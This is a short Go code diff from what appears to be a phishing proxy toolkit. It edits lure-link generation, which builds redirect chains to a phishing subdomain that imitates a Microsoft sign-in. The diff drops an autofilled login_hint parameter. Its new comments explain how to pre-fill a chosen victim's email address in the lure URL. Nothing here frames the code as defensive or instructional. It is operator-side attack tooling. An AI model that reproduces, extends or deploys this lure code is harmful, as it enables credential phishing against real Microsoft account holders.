@@ -1243,10 +1243,9 @@ func (t *Terminal) handleLures(args []string) error {
 					}
 					finalURL = purl
 				}
-				// Append autofill placeholder as a query parameter so the proxy
-				// can forward it to Microsoft as login_hint (fragments are never
-				// sent to the server, query params are).
-				finalURL += "?login_hint=SILENTCODERSEMAIL"
+				// login_hint is intentionally omitted — the lure URL works without it.
+				// To pre-fill the email for a specific victim, append ?login_hint=email@domain.com
+				// to the finalURL before passing to GenerateRedirectChain.
 
 				// Derive phishBase from finalURL so we always use the correct subdomain.
 				parsedFinal, err := url.Parse(finalURL)
